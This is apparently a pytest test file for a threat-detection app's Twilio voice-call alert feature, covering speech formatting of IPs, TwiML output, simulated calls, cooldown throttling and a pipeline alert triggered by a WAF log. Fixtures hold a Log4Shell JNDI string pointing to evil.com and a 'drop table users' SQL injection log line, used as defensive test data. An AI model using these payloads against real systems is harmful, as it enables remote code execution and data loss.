import pytest
from app.notifications.twilio_voice import TwilioVoiceNotifier, _format_ip_for_speech


def test_ip_speech_formatting():
    assert _format_ip_for_speech("192.168.1.100") == "192 dot 168 dot 1 dot 100"
    assert _format_ip_for_speech("10.0.0.1") == "10 dot 0 dot 0 dot 1"
    assert _format_ip_for_speech("") == "an unknown host"
    assert _format_ip_for_speech("0.0.0.0") == "an unknown host"


def test_twiml_generation():
    notifier = TwilioVoiceNotifier()
    twiml = notifier.build_twiml(
        threat_type="SQL Injection",
        src_ip="198.51.100.45",
        detail="UNION SELECT bypass attempt",
    )
    assert "<Response>" in twiml
    assert '<Say voice="alice" language="en-US">' in twiml
    assert "SQL Injection" in twiml
    assert "198 dot 51 dot 100 dot 45" in twiml
    assert "<Hangup/>" in twiml
    assert "</Response>" in twiml


def test_simulated_voice_call_dispatch():
    notifier = TwilioVoiceNotifier()
    # Unconfigured credentials triggers simulation mode
    result = notifier.send_voice_call(
        threat_type="Log4Shell (JNDI)",
        src_ip="203.0.113.19",
        detail="Injected ${jndi:ldap://evil.com/a}",
        to_number="+17372508034",
        force=True,
    )
    assert result["status"] == "simulated"
    assert result["to_number"] == "+17372508034"
    assert "Log4Shell" in result["threat_type"]
    assert len(notifier.call_history) > 0


def test_cooldown_throttling():
    notifier = TwilioVoiceNotifier()
    # First call
    res1 = notifier.send_voice_call(
        threat_type="Command Injection",
        src_ip="10.0.0.99",
        force=False,
    )
    # Second immediate call should be throttled
    res2 = notifier.send_voice_call(
        threat_type="Command Injection",
        src_ip="10.0.0.99",
        force=False,
    )
    assert res2["status"] == "throttled"
    assert "cooldown guard" in res2["reason"]
    assert res2.get("remaining_cooldown_seconds", 0) > 0
    status = notifier.get_status()
    assert status["cooldown_active"] is True
    assert status["cooldown_remaining_seconds"] > 0


def test_status_reporting():
    notifier = TwilioVoiceNotifier()
    status = notifier.get_status()
    assert "enabled" in status
    assert "configured" in status
    assert status["target_number"] == "+17372508034"
    assert "recent_calls" in status


def test_pipeline_critical_log_triggers_voice_alert(monkeypatch):
    import time
    from app.notifications.twilio_voice import twilio_voice_notifier
    from app.api.routes import pipeline, store_and_broadcast, persistence_manager

    # Avoid waiting for MinIO network timeout in unit test
    monkeypatch.setattr(persistence_manager, "persist_event", lambda **kwargs: kwargs.get("record", {}))

    initial_count = len(twilio_voice_notifier.call_history)
    
    # Critical threat log (SQL Injection drop table)
    raw_critical = "Nov  6 03:00:00 waf-gateway nginx: src=198.51.100.55 event=attack POST /api/v1/query drop table users --"
    ir = pipeline.process(raw_critical, source="waf-gateway")
    record = store_and_broadcast(ir, source_name="waf-gateway")
    
    # Wait briefly for background thread to record call
    time.sleep(0.3)
    
    assert len(twilio_voice_notifier.call_history) >= initial_count + 1
    latest = twilio_voice_notifier.call_history[0]
    assert latest["to_number"] == "+17372508034"
    assert latest["status"] in ("simulated", "initiated", "throttled")

